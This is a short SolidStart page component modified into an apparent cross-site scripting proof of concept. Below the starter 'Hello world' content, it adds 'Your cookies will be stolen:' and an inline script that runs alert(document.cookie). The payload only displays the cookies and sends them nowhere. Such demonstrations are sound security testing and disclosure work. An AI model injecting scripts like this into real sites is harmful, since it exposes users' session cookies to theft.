import { Title } from "solid-start";
import Counter from "~/components/Counter";

export default function Home() {
  return (
    <main>
      <Title>Hello World</Title>
      <h1>Hello world!</h1>
      <h1>PoC by w3shi (S. Lakshmi Vignesh)</h1>
      <Counter />
      <p>
        Visit{" "}
        <a href="https://start.solidjs.com" target="_blank">
          start.solidjs.com
        </a>{" "}
        to learn how to build SolidStart apps.
      </p>
      <p>Your cookies will be stolen:</p>
      {/* XSS PoC Script */}
      <script>
        {`alert(document.cookie);`}
      </script>
    </main>
  );
}
